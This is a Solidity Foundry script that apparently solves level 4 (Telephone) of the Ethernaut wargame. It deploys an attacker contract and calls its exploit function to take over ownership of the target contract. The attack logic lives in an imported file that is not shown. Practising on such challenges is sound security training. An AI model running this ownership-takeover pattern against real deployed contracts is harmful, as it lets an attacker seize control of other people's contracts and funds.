// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { ITelephone } from "ethernaut/04-telephone/ITelephone.sol";
import { TelephoneAttacker } from "ethernaut/04-telephone/TelephoneAttacker.sol";

contract TelephoneScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address telephoneAddr = vm.envAddress("L04_TELEPHONE_ADDRESS");
        ITelephone telephone = ITelephone(telephoneAddr);

        // Step 1: deploy attacker
        TelephoneAttacker telephoneAttacker = new TelephoneAttacker();

        // Step 2: change the owner
        telephoneAttacker.exploit(telephone);

        vm.stopBroadcast();
    }
}
